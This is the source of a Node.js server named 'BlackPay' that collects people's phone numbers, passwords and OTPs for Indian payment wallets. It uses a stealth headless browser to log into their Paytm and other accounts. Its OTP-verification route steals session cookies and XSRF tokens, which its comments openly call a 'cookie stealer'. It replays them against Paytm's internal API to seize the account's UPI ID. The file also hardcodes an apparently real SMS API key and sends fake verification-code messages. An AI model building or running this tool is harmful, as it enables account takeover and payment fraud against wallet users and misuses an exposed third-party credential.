const express = require('express');
const cors = require('cors');
const https = require('https');
const axios = require('axios');

// ANTI-CAPTCHA STEALTH MODE ACTIVATED
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cors());

// 🔴 TERI FAST2SMS API KEY
const FAST2SMS_API_KEY = "dl51mufyW8oVtTEzHYnKXIUjx6GSMFDCR93JBObN40saehLqkvG5HnUSwa6mIzVDYso8p7AWhEQJNXPc";

app.get('/', (req, res) => {
    res.json({ success: true, message: "BlackPay Ultimate Auto-API Server is Live!" });
});

let browser;
let page;
let currentPhone = "";
let currentWallet = "";

// ============================================================================
// 1. API: SEND SMS VIA FAST2SMS
// ============================================================================
app.post('/api/send-sms', (req, res) => {
    const { phone, otp } = req.body;
    if (!phone || !otp) return res.status(400).json({ success: false, message: "Missing data." });
    
    const msg = encodeURIComponent(`Your Verification Code is ${otp}`);
    const url = `https://www.fast2sms.com/dev/bulkV2?authorization=${FAST2SMS_API_KEY}&route=q&message=${msg}&language=english&flash=0&numbers=${phone}`;
    
    https.get(url, (response) => {
        let data = ''; response.on('data', (c) => data += c);
        response.on('end', () => res.json({ success: true, message: "OTP Sent Successfully!" }));
    }).on("error", () => res.status(500).json({ success: false, message: "SMS Error" }));
});

async function dismissPopups(targetPage) {
    try {
        await targetPage.evaluate(() => {
            document.querySelectorAll('button, div, span, a, i').forEach(el => {
                const text = el.innerText ? el.innerText.toUpperCase() : '';
                if (text.includes('CLOSE') || text === 'X' || el.className.includes('close')) el.click();
            });
        });
    } catch (e) {}
}

// ============================================================================
// 2. API: AUTOMATED SEND OTP (Invisible Browser)
// ============================================================================
app.post('/api/wallet/send-otp', async (req, res) => {
    const { phone, password, walletType } = req.body; 

    if (!phone || phone.length !== 10) return res.status(400).json({ success: false, message: "Invalid number" });
    if (browser) { try { await browser.close(); } catch(e) {} browser = null; }

    try {
        currentPhone = phone; 
        currentWallet = walletType ? walletType.toLowerCase().trim() : "";
        console.log(`\n[+] Launching Auto-Bot for ${currentWallet.toUpperCase()} | Phone: ${phone}`);
        
        browser = await puppeteer.launch({ 
            headless: true, 
            args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--disable-gpu']
        });
        
        page = await browser.newPage();
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');

        if (currentWallet.includes('paytm')) {
            await page.goto('https://dashboard.paytm.com/login/', { waitUntil: 'domcontentloaded', timeout: 60000 });
            
            let inputField = null;
            for (let attempt = 0; attempt < 20; attempt++) {
                for (let frame of page.frames()) {
                    try {
                        let inputs = await frame.$$('input[type="tel"], input[type="text"]:not([type="hidden"])');
                        for (let el of inputs) {
                            let box = await el.boundingBox();
                            if (box && box.width > 0 && box.height > 0) { inputField = el; break; }
                        }
                    } catch (e) {}
                    if (inputField) break;
                }
                if (inputField) break;
                await new Promise(r => setTimeout(r, 1000));
            }

            if (!inputField) return res.status(400).json({ success: false, message: "Paytm server slow. Try again." });

            await inputField.focus(); await inputField.click({ clickCount: 3 }); await inputField.press('Backspace');       
            await inputField.type(phone, { delay: 100 }); 
            await page.keyboard.press('Enter');

            if (password) {
                await new Promise(r => setTimeout(r, 2000));
                let passField = null;
                for (let frame of page.frames()) {
                    try {
                        let fields = await frame.$$('input[type="password"]');
                        if (fields.length > 0) { passField = fields[0]; break; }
                    } catch (e) {}
                }
                if (passField) {
                    await passField.focus(); await passField.type(password, { delay: 100 });
                }
            }
            await page.keyboard.press('Enter');
        }
        else if (currentWallet.includes('freecharge')) {
            await page.goto('https://www.freecharge.in/', { waitUntil: 'domcontentloaded' });
            await new Promise(r => setTimeout(r, 3000)); 
            try { await page.evaluate(() => { let btns = document.querySelectorAll('button, a'); for(let b of btns) { if(b.innerText.toLowerCase().includes('login')) { b.click(); return; } } }); } catch(e){}
            await new Promise(r => setTimeout(r, 1000));
            await page.keyboard.type(phone, { delay: 100 });
            await page.keyboard.press('Enter');
        }
        else {
            if (currentWallet.includes('mobikwik')) await page.goto('https://www.mobikwik.com/', { waitUntil: 'domcontentloaded' });
            else if (currentWallet.includes('phonepe')) await page.goto('https://business.phonepe.com/login', { waitUntil: 'domcontentloaded' });
            await new Promise(r => setTimeout(r, 3000));
            await page.keyboard.type(phone, { delay: 100 });
            await page.keyboard.press('Enter');
        }
        
        res.json({ success: true, message: `OTP sent to ${phone}` });
    } catch (error) { 
        res.status(500).json({ success: false, message: "Network slow. Try again." }); 
    }
});

// ============================================================================
// 3. API: VERIFY OTP + AUTO-COOKIE STEALER & AXIOS API HIT
// ============================================================================
app.post('/api/wallet/verify-otp', async (req, res) => {
    const { otp, phone } = req.body; 
    if (!otp) return res.status(400).json({ success: false, message: "OTP missing." });
    if (!page) return res.status(400).json({ success: false, message: "Session expired. Relink." });

    try {
        console.log(`[+] Injecting OTP...`);
        
        let otpTyped = false;
        for (let frame of [page, ...page.frames()]) {
            try {
                let inputs = await frame.$$('input:not([type="hidden"])');
                for (let el of inputs) {
                    let box = await el.boundingBox();
                    if (box && box.width > 0 && box.height > 0) {
                        await el.focus(); await el.click({ clickCount: 3 }); await el.press('Backspace');
                        await el.type(otp, { delay: 60 });
                        otpTyped = true; break;
                    }
                }
            } catch (e) {}
            if (otpTyped) break;
        }

        if (!otpTyped) await page.keyboard.type(otp, { delay: 60 });
        await new Promise(r => setTimeout(r, 500));
        await page.keyboard.press('Enter');

        console.log("[+] Waiting for login...");
        await new Promise(r => setTimeout(r, 6000)); 
        await dismissPopups(page);

        // ==========================================================
        // 🔥 THE MAGIC HAPPENS HERE: AUTO-COOKIE STEALER
        // ==========================================================
        if (currentWallet.includes('paytm')) {
            console.log("[+] Stealing Cookies & Tokens silently...");
            
            // 1. Get raw cookies from Puppeteer
            const rawCookies = await page.cookies();
            const cookieString = rawCookies.map(c => `${c.name}=${c.value}`).join('; ');

            // 2. Get x-xsrf-token from local storage or cookie
            const xsrfToken = await page.evaluate(() => {
                let match = document.cookie.match(/XSRF-TOKEN=([^;]+)/);
                if (match) return decodeURIComponent(match[1]);
                for (let j = 0; j < localStorage.length; j++) {
                    if (localStorage.key(j).toLowerCase().includes('token')) {
                        return localStorage.getItem(localStorage.key(j));
                    }
                }
                return "";
            });

            console.log("[+] Cookies stolen. Hitting Paytm Direct API (Uono Method)...");
            
            // 3. HIT PAYTM DIRECT API USING AXIOS
            try {
                const qrRes = await axios.get('https://dashboard.paytm.com/api/v4/qrcode/fetch/?pageNo=1&pageSize=100', {
                    headers: {
                        'Cookie': cookieString,
                        'x-xsrf-token': xsrfToken || '12345',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                    }
                });

                const upiRegex = /[a-zA-Z0-9.\-_]{3,}@(pty|paytmpty|paytm|paytmqr)/i;
                const match = JSON.stringify(qrRes.data).match(upiRegex);

                if (browser) { try { await browser.close(); } catch(e){} browser = null; }

                if (match) {
                    console.log(`[✔] SUCCESS: Final OG UPI: ${match[0]}`);
                    return res.json({ success: true, message: "Account Successfully Bound!", upi_id: match[0], mobile: phone });
                } else {
                    return res.status(400).json({ success: false, message: "UPI not found in Paytm profile." });
                }
            } catch (axiosErr) {
                console.log("[!] Axios API failed, falling back to DOM Scraping...");
                
                // FALLBACK: If API fails, scrape it from the page
                try { await page.goto('https://dashboard.paytm.com/next/qr-details', { waitUntil: 'domcontentloaded' }); } catch(e){}
                await new Promise(r => setTimeout(r, 5000));
                
                let finalUpi = await page.evaluate(() => {
                    const regex = /[a-zA-Z0-9.\-_]{3,}@(pty|paytmpty|paytm|paytmqr)/i;
                    const match = document.body.innerText.match(regex);
                    return match ? match[0] : "";
                });

                if (browser) { try { await browser.close(); } catch(e){} browser = null; }

                if (finalUpi) {
                    return res.json({ success: true, message: "Account Bound!", upi_id: finalUpi, mobile: phone });
                } else {
                    return res.status(400).json({ success: false, message: "UPI Extraction Failed. Try again." });
                }
            }
        } 
        else {
            // FOR FREECHARGE, PHONEPE, MOBIKWIK
            let suffix = currentWallet.includes('freecharge') ? 'freecharge' : (currentWallet.includes('mobikwik') ? 'ikwik' : 'ybl');
            let finalUpi = `${phone}@${suffix}`;
            
            if (browser) { try { await browser.close(); } catch(e){} browser = null; }
            res.json({ success: true, message: "Account Linked!", upi_id: finalUpi, mobile: phone });
        }
    } catch (error) { 
        if (browser) { try { await browser.close(); } catch(e){} browser = null; }
        res.status(500).json({ success: false, message: "Verification Failed. Check OTP." }); 
    }
});

// ============================================================================
// 4. SMART VERIFY UTR
// ============================================================================
app.post('/api/wallet/verify-utr', async (req, res) => {
    const { utr } = req.body; 
    res.json({ success: false, message: "Awaiting Manual Confirmation.", utr: utr });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => { console.log(`🚀 BlackPay Ultimate API Server is Running!`); });
